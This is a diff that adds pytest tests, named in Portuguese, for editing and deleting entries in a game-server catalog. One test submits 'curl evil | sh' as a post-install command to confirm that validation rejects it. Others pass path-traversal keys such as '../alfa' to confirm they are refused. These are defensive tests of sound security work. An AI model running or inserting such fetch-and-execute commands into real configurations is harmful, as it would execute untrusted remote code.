@@ -247,3 +247,82 @@ def test_arquivo_com_nome_diferente_da_chave_e_ignorado(catalog, game_data, tmp_
 def test_jogo_desconhecido(catalog):
     with pytest.raises(NotFound):
         catalog.get("nao-existe")
+
+
+# --- Editar e apagar ------------------------------------------------------------------
+
+def test_editar_dinamico_troca_os_dados_e_sobrevive_a_recarga(catalog, game_data, tmp_path):
+    catalog.add_dynamic(game_data)
+    catalog.update("meujogo", {**game_data, "name": "Outro Nome", "memory_mb": 8192})
+    other = cat.Catalog(tmp_path / "games", tmp_path / "dinamico")
+    assert (other.get("meujogo").name, other.get("meujogo").memory_mb) == ("Outro Nome", 8192)
+
+
+def test_editar_nao_troca_a_chave(catalog, game_data):
+    catalog.add_dynamic(game_data)
+    with pytest.raises(ValidationError, match="key"):
+        catalog.update("meujogo", {**game_data, "key": "outro"})
+
+
+def test_editar_passa_pela_mesma_validacao_de_adicionar(catalog, game_data):
+    catalog.add_dynamic(game_data)
+    with pytest.raises(ValidationError):
+        catalog.update("meujogo", {**game_data, "post_install_cmd": "curl evil | sh"})
+    assert catalog.get("meujogo").name == "Meu Jogo", "a recusa nao gravou nada"
+
+
+def test_editar_jogo_que_nao_existe(catalog, game_data):
+    with pytest.raises(NotFound):
+        catalog.update("meujogo", game_data)
+
+
+def _alfa_data(**changes) -> dict:
+    data = {"key": "alfa", "name": "Alfa Editado", "app_id": 1001, "ports": ["7001/udp", "7002/udp"],
+            "game_port": 7001, "query_port": 7002, "start_script": "alfa.sh", "start_args": "-port={PORT}"}
+    return {**data, **changes}
+
+
+def test_editar_curado_troca_os_dados_e_mantem_o_shell_do_arquivo(catalog, tmp_path):
+    catalog.update("alfa", _alfa_data())
+    for current in (catalog.get("alfa"), cat.Catalog(tmp_path / "games", tmp_path / "dinamico").get("alfa")):
+        assert current.name == "Alfa Editado"
+        assert (current.source, current.edited) == (cat.SOURCE_CURATED, True)
+        assert "segredo do instalador" in current.post_install, "o POST_INSTALL do .env continua valendo"
+    assert "segredo" not in str(catalog.stored("alfa")), "o formulario de edicao nunca ve o shell"
+
+
+def test_apagar_curado_editado_devolve_o_do_arquivo(catalog, tmp_path):
+    catalog.update("alfa", _alfa_data())
+    restored = catalog.remove("alfa")
+    assert restored is not None
+    assert (catalog.get("alfa").name, catalog.get("alfa").edited) == ("Alfa", False)
+    assert list((tmp_path / "dinamico").glob("*.json")) == []
+
+
+def test_curado_sem_edicao_nao_se_apaga_pela_api(catalog):
+    with pytest.raises(Conflict, match=r"games/alfa\.env"):
+        catalog.remove("alfa")
+    assert catalog.get("alfa")
+
+
+def test_curado_que_o_broker_nao_cria_nao_se_edita(catalog):
+    data = {"key": "conta", "name": "Conta", "app_id": 1004, "ports": ["7200/udp"], "game_port": 7200}
+    with pytest.raises(Conflict):
+        catalog.update("conta", data)
+
+
+def test_apagar_dinamico_some_de_vez(catalog, game_data, tmp_path):
+    catalog.add_dynamic(game_data)
+    assert catalog.remove("meujogo") is None
+    with pytest.raises(NotFound):
+        catalog.get("meujogo")
+    with pytest.raises(NotFound):
+        cat.Catalog(tmp_path / "games", tmp_path / "dinamico").get("meujogo")
+
+
+@pytest.mark.parametrize("key", ["../alfa", "a/b", "", "A"])
+def test_chave_que_nao_e_chave_nao_vira_caminho(catalog, key, game_data):
+    with pytest.raises(ValidationError, match="key"):
+        catalog.remove(key)
+    with pytest.raises(ValidationError):
+        catalog.update(key, game_data)
